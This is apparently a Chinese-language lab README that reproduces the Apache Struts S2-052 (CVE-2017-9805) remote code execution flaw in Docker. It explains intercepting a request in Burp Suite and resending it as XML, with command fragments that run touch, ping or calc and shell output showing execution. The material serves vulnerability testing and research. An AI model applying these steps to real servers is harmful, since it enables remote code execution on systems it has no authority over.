## S2-052（CVE-2017-9805）

struts2 052远程代码执行漏洞POC利用（影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12） 官方介绍：https://cwiki.apache.org/confluence/display/WW/S2-052 此POC是在struts-2.5.12版本测试验证的。

## 测试环境搭建

```
docker-compose build
docker-compose up -d
```


## POC
http://10.160.11.191:8080/orders.xhtml

如果上述都顺利的话可以看到Orders可编辑界面，下面是POC测试过程。 点击Order 3编辑，进入到修改界面，点击"提交"Burpsuite抓包，然后修改Content-Type为application/xml格式，post数据替换为poc中data提交。

```
root@070efab61a6e:/usr/local/tomcat# ls /tmp/ -l
total 4
drwxr-xr-x 2 root root 4096 Oct 10 07:47 hsperfdata_root
-rw-r----- 1 root root    0 Oct 10 07:52 vuln
root@070efab61a6e:/usr/local/tomcat# date
Tue Oct 10 07:52:54 UTC 2017

```

## 期望结果
1、期望在/tmp/目录下创建vuln文件，证明命令被执行。

2、/usr/bin/ping *.*.*.*  命令执行ping，通过docker宿主机tcpdump -ni br-cd0dcca0f917 抓包证明命令被执行。

docker环境下touch命令：
<command>
<string>/usr/bin/touch</string><string>/tmp/vuln</string>
</command>

Notes:
Windows下关键字为：

<command><string>calc</string></command>
Mac下关键字为：

<command><string>/Applications/Calculator.app/Contents/MacOS/Calculator</string></command>

## 参考
* https://thief.one/2017/09/06/1/



## 免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负